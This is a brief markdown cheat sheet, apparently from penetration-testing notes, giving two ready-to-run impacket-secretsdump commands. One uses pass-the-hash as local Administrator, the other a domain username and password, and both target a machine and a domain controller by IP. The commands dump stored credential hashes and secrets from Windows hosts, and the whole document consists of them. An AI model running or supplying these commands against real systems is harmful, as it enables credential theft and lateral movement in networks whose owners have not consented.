# Impacket-secretsdump

### 1) Local Admin on machine

    impacket-secretsdump ./Administrator@machine -hashes ':ffffffffffffffffffffffffffffffff' -dc-ip 10.10.100.1 -target-ip 10.10.100.12

### 2) Using credentials 

    impacket-secretsdump domain.com/user:'Password123!'@machine -dc-ip 10.10.100.1 -target-ip 10.10.100.12
